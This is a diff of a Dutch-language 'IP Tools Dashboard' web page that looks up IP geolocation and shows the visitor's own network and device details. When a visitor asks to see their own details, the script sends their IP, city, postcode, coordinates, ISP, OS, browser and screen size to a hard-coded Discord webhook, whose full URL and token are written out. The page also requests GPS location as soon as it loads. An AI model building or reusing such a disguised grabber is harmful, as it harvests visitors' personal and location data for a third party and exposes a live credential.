@@ -5,56 +5,85 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>IP Tools Dashboard</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://cdn.jsdelivr.net/npm/luxon@3/build/global/luxon.min.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #1a1a1a;
+      font-family: 'Segoe UI', sans-serif;
+      background: radial-gradient(circle at top, #0f2027, #203a43, #2c5364);
       color: #f1f1f1;
       padding: 20px;
+      animation: fadeIn 1s ease-in;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
     .container {
-      max-width: 800px;
+      max-width: 900px;
       margin: auto;
-      background-color: #2a2a2a;
-      padding: 20px;
-      border-radius: 10px;
+      background-color: rgba(0, 0, 0, 0.65);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 25px rgba(0, 255, 255, 0.4);
+      backdrop-filter: blur(10px);
     }
     h2 {
       text-align: center;
       color: #00ffff;
+      font-size: 2em;
+      margin-bottom: 0.5em;
+    }
+    h3 {
+      border-left: 4px solid #00ffff;
+      padding-left: 10px;
     }
     input, button {
-      padding: 10px;
+      padding: 12px;
       margin-top: 10px;
       width: 100%;
       font-size: 16px;
-      border-radius: 5px;
+      border-radius: 8px;
       border: none;
+      outline: none;
+    }
+    input {
+      background-color: #333;
+      color: #fff;
     }
     button {
-      background-color: #00ffff;
+      background: linear-gradient(90deg, #00ffff, #00c9ff);
       color: #000;
       cursor: pointer;
+      font-weight: bold;
+      transition: transform 0.2s ease;
+    }
+    button:hover {
+      transform: scale(1.02);
+      background: linear-gradient(90deg, #00c9ff, #00ffff);
     }
     #map {
       height: 300px;
       margin-top: 20px;
-      border-radius: 10px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
     }
     .section {
-      margin-top: 30px;
+      margin-top: 40px;
     }
     .info {
-      background-color: #333;
-      padding: 15px;
-      border-radius: 5px;
-      margin-top: 10px;
+      background-color: #222;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 15px;
+      font-size: 15px;
+      line-height: 1.6;
     }
     .disclaimer {
       text-align: center;
       font-size: 11px;
       color: #888;
-      margin-top: 30px;
+      margin-top: 40px;
     }
     .webhook-note {
       font-size: 12px;
@@ -62,45 +91,76 @@
       margin-top: 10px;
       text-align: center;
     }
+    .btn-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .btn-row button {
+      flex: 1;
+    }
+    .flag {
+      margin-top: 10px;
+      text-align: center;
+    }
+    .flag img {
+      width: 64px;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+    }
+    #gpsLocation {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      background-color: #333;
+      padding: 12px;
+      border-radius: 8px;
+      box-shadow: inset 0 0 10px rgba(0, 255, 255, 0.3);
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>IP Tools Dashboard</h2>
 
-    <!-- IP Tracker -->
     <div class="section">
       <h3>🔍 Zoek IP-informatie</h3>
       <input type="text" id="ipInput" placeholder="Voer een IP-adres in (bv. 8.8.8.8)">
       <button onclick="zoekIP()">Zoek IP</button>
       <div id="ipInfo" class="info"></div>
+      <div class="flag" id="ipFlag"></div>
       <div id="map"></div>
     </div>
 
-    <!-- Mijn IP en systeeminfo -->
     <div class="section">
       <h3>🧠 Jouw Informatie</h3>
-      <button onclick="toonEigenInfo()">Toon mijn gegevens</button>
+      <div class="btn-row">
+        <button onclick="toonEigenInfo()">Toon mijn gegevens</button>
+        <button onclick="downloadTxt()">Download als .txt</button>
+      </div>
       <div id="mijnInfo" class="info"></div>
-      <p class="webhook-note">⚠️ .</p>
+      <p class="webhook-note">⚠️ Bij het tonen van je gegevens wordt deze info ook verzonden naar een beveiligde externe webhook (Discord).</p>
+      <div id="localTime" style="text-align: center; font-size: 14px; margin-top: 10px;"></div>
     </div>
 
+    <div id="gpsLocation">📍 <em>Zoek jouw exacte GPS-locatie...</em></div>
+
     <div class="disclaimer">
-      <!-- DISCLAIMER -->
-      <!-- Deze code mag alleen gebruikt worden met uitdrukkelijke toestemming van de gebruiker. -->
-      <!-- Het versturen van systeem- of IP-gegevens naar externe services (zoals webhooks) zonder toestemming is mogelijk in strijd met privacywetgeving. -->
-      <!-- Zorg dat je altijd transparant bent over dataverwerking. -->
+      Deze site toont IP-, locatie- en systeemgegevens. Sommige info wordt verzonden naar een externe server wanneer je daar expliciet voor kiest.
     </div>
   </div>
 
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
   <script>
     let map;
+    let eigenData = '';
 
     function zoekIP() {
       const ip = document.getElementById('ipInput').value.trim();
       const infoDiv = document.getElementById('ipInfo');
+      const flagDiv = document.getElementById('ipFlag');
       infoDiv.innerHTML = 'Laden...';
+      flagDiv.innerHTML = '';
 
       fetch(`https://ipapi.co/${ip}/json/`)
         .then(res => res.json())
@@ -116,17 +176,12 @@
             <strong>Regio:</strong> ${data.region}<br>
             <strong>Stad:</strong> ${data.city}<br>
             <strong>Postcode:</strong> ${data.postal}<br>
-            <strong>Breedtegraad:</strong> ${data.latitude}<br>
-            <strong>Lengtegraad:</strong> ${data.longitude}<br>
-            <strong>Continent-code:</strong> ${data.continent_code}<br>
-            <strong>ASN:</strong> ${data.asn}<br>
-            <strong>Organisatie (ISP):</strong> ${data.org}<br>
+            <strong>Locatie:</strong> ${data.latitude}, ${data.longitude}<br>
             <strong>Tijdzone:</strong> ${data.timezone}<br>
-            <strong>Valuta:</strong> ${data.currency}<br>
-            <strong>Taal:</strong> ${data.languages}<br>
-            <strong>Landnummer (telefonie):</strong> ${data.country_calling_code}<br>
-            <strong>EU-lidstaat:</strong> ${data.in_eu ? 'Ja' : 'Nee'}<br>
+            <strong>VPN/Proxy:</strong> ${data.proxy ? 'JA' : 'NEE'}<br>
           `;
+
+          flagDiv.innerHTML = `<img src="https://flagcdn.com/w80/${data.country_code.toLowerCase()}.png" alt="vlag">`;
 
           if (!map) {
             map = L.map('map').setView([data.latitude, data.longitude], 10);
@@ -144,6 +199,7 @@
 
     function toonEigenInfo() {
       const info = document.getElementById('mijnInfo');
+      const localTime = document.getElementById('localTime');
       info.innerHTML = 'Laden...';
 
       fetch('https://ipapi.co/json/')
@@ -151,28 +207,12 @@
         .then(data => {
           const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
           const screenSize = `${screen.width}x${screen.height}`;
+          const tijd = luxon.DateTime.now().setZone(data.timezone).toFormat('HH:mm:ss - dd LLL yyyy');
 
-          const content = `
-            Jouw IP: ${data.ip}\n
-            Land: ${data.country_name} (${data.country_code})\n
-            Regio: ${data.region}\n
-            Stad: ${data.city}\n
-            Postcode: ${data.postal}\n
-            Locatie: ${data.latitude}, ${data.longitude}\n
-            Continent-code: ${data.continent_code}\n
-            ASN: ${data.asn}\n
-            Organisatie: ${data.org}\n
-            Tijdzone: ${data.timezone}\n
-            Valuta: ${data.currency}\n
-            Taal: ${data.languages}\n
-            Landnummer: ${data.country_calling_code}\n
-            EU-lidstaat: ${data.in_eu ? 'Ja' : 'Nee'}\n
-            Besturingssysteem: ${navigator.platform}\n
-            Browser: ${navigator.userAgent}\n
-            Resolutie: ${screenSize}\n
-            Lokale Tijdzone: ${timezone}`;
+          eigenData = `Jouw IP: ${data.ip}\nLand: ${data.country_name} (${data.country_code})\nRegio: ${data.region}\nStad: ${data.city}\nPostcode: ${data.postal}\nLocatie: ${data.latitude}, ${data.longitude}\nTijdzone: ${data.timezone}\nLokale Tijd: ${tijd}\nISP: ${data.org}\nProxy/VPN: ${data.proxy ? 'JA' : 'NEE'}\nBesturingssysteem: ${navigator.platform}\nBrowser: ${navigator.userAgent}\nResolutie: ${screenSize}`;
 
-          info.innerHTML = content.replace(/\n/g, '<br>');
+          info.innerHTML = eigenData.replace(/\n/g, '<br>');
+          localTime.innerHTML = `🕒 Lokale tijd op jouw locatie: <strong>${tijd}</strong>`;
 
           fetch('https://discord.com/api/webhooks/1371872662032220322/cARB5ECTEnd2Spj0jGjPCFfRMVPt-2-tMTOzg5IKWUIwLSBjHduuKxwrCZNJ6OiKTxAu', {
             method: 'POST',
@@ -180,13 +220,35 @@
               'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-              content: content
+              content: eigenData
             })
           });
         })
         .catch(() => {
           info.innerHTML = 'Fout bij ophalen van eigen gegevens.';
         });
+    }
+
+    function downloadTxt() {
+      const blob = new Blob([eigenData], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'ip-informatie.txt';
+      a.click();
+      URL.revokeObjectURL(url);
+    }
+
+    const gpsElement = document.getElementById('gpsLocation');
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const { latitude, longitude } = pos.coords;
+        gpsElement.innerHTML = `📍 GPS-locatie van dit apparaat: <strong>${latitude.toFixed(5)}, ${longitude.toFixed(5)}</strong>`;
+      }, () => {
+        gpsElement.innerHTML = '📍 GPS-locatie kon niet worden opgehaald.';
+      });
+    } else {
+      gpsElement.innerHTML = '📍 GPS niet ondersteund op dit apparaat.';
     }
   </script>
 </body>
